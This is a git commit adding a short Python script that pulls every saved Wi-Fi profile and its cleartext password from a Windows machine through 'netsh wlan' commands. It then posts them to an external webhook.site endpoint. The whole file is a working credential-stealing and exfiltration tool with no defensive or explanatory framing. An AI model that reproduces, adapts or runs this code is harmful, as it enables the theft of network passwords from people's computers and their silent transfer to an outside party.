e0d576dae254bc8c20628c1c50b90530dca81659
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2023-05-20 21:36:30 +0200

    Create SendIt.py

---
+++ SendIp.py
@@ -0,0 +1,37 @@
+import subprocess, os, sys, requests, re, urllib
+
+url = 'https://webhook.site/###################'
+
+found_ssids = []
+pwnd = []
+wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
+wlan_key_regex = r"Key Content\s+:\s(.*)$"
+
+get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
+
+matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
+for match in matches:
+    for group in match.groups():
+        found_ssids.append(group.strip())
+
+for ssid in found_ssids:
+    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
+    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+    for match in matches:
+        for group in match.groups():
+            pwnd.append({
+                "SSID":ssid,
+                "Password":group.strip()
+                }) 
+
+if len(pwnd) == 0:
+    print("No Wi-Fi profiles found. Exiting...")
+    sys.exit()
+
+print("Wi-Fi profiles found. Check your webhook...")
+
+final_payload = ""
+for pwnd_ssid in pwnd:
+    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+
+r = requests.post(url, params="format=json", data=final_payload)
